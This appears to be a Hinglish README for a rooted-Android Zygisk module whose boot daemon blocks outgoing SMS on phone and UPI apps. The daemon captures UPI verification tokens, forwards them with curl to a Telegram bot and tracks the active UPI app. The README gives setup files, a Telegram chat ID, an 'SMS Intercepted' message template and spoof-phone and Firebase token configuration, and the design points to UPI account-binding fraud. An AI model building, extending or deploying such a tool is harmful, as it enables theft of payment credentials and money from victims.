# Phase 3 — Local Shell (Bina APK) (Hinglish)

## service.sh — background daemon

Boot pe `service.sh` chalta hai. Ye **APK ki jagah** local kaam karta hai.

## Kya karta hai (har 2 second)

1. **SMS block** — `appops SEND_SMS deny` phone + UPI apps pe
2. **Telegram forward** — blocked token file padh ke `curl` se bhejta hai
3. **Config sync** — spoof phone file update
4. **Foreground UPI track** — active package file me likhta hai

## Telegram setup (APK ke bina)

`config.json` ya alag file me daalo:

```json
{
  "telegram_bot_token": "BOT_TOKEN_YAHAN",
  "telegram_chat_id": "-1003553669855"
}
```

Ya file banao:
`/data/local/tmp/hivirtus_telegram_credentials.json`

```json
{
  "telegram_bot_token": "...",
  "telegram_chat_id": "-100..."
}
```

Reboot ya 2 sec wait — `service.sh` automatically forward karega.

## Token message format

```
📱 SMS Intercepted
Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥
-----------------
To: +91...
Message: YESAMAZONUPI token...
```

## Firebase auto-token

Sender phone pe bhi **APK optional** tha — ab config se:

`/data/local/tmp/hivirtus_firebase_autotoken.json`

Native overlay menu future me expand hoga; abhi shell + manual JSON.

## Useful commands

```bash
# Config edit
nano /data/adb/modules/hivirtus_zygisk_mode/config.json

# Blocked token dekhna
cat /data/local/tmp/hivirtus_outgoing_blocked.json

# Module alive?
cat /data/local/tmp/hivirtus_module_heartbeat.txt
```
